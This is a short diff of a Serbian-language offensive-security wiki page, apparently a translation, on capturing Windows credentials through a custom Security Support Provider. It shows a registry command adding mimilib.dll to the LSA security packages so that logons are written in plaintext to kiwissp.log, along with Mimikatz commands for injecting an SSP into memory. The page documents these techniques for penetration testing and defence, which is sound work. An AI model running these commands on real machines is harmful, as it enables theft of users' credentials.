@@ -19,15 +19,15 @@ HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
 Dodajte `mimilib.dll` na listu provajdera za podršku bezbednosti (Security Packages):
-```powershell
+```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
 I nakon ponovnog pokretanja, sve akreditive možete pronaći u čistom tekstu u `C:\Windows\System32\kiwissp.log`
 
 #### U memoriji
 
-Takođe možete ovo injektovati direktno u memoriju koristeći Mimikatz (imajte na umu da može biti malo nestabilno/ne radi):
-```powershell
+Takođe možete direktno injektovati ovo u memoriju koristeći Mimikatz (imajte na umu da može biti malo nestabilno/ne radi):
+```bash
 privilege::debug
 misc::memssp
 ```
